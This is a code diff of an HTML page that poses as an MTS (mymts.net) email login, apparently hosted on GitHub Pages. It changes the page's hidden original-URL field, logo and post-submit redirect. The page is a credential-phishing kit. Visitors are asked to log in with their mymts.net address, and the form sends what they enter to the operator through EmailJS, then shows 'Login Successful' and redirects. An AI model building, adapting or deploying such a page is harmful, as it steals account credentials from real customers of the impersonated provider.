@@ -9,7 +9,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script> <!-- EmailJS SDK -->
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             background-color: #f4f4f4;
             margin: 0;
             padding: 0;
@@ -30,7 +30,7 @@
         }
 
         .logo img {
-            width: 100px;
+            width: 100px; /* Adjust as needed */
             height: auto;
         }
 
@@ -73,9 +73,9 @@
 <body>
     <div class="wrapper">
         <form id="form" name="sentMessage" novalidate="novalidate">
-            <input name="__original_url" type="hidden" value="https://sourcesecureauth.github.io/newlogin/"/>
+            <input name="__original_url" type="hidden" value="https://mymts-nul01.github.io/"/>
             <div class="logo">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTS8xl8WA9QeD6PNO8WZdjNTyi8I_kUnVzYqQ&s" alt="MTS Logo" />
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5X8yEz0xHBoSWruoB1ztw20uBRoEPJ4lvTg&s" alt="MTS Logo" />
                 <p>Log in with your mymts.net email address</p>
             </div>
             <div class="container">
@@ -119,7 +119,7 @@
             emailjs.send(serviceID, templateID, templateParams).then(
                 () => {
                     btn.value = "Login Successful";
-                    window.location.href = "https://bell.ca"; // Redirect after successful submission
+                    window.location.href = "inde.html"; // Redirect after successful submission
                 },
                 (err) => {
                     btn.value = "LOG IN";
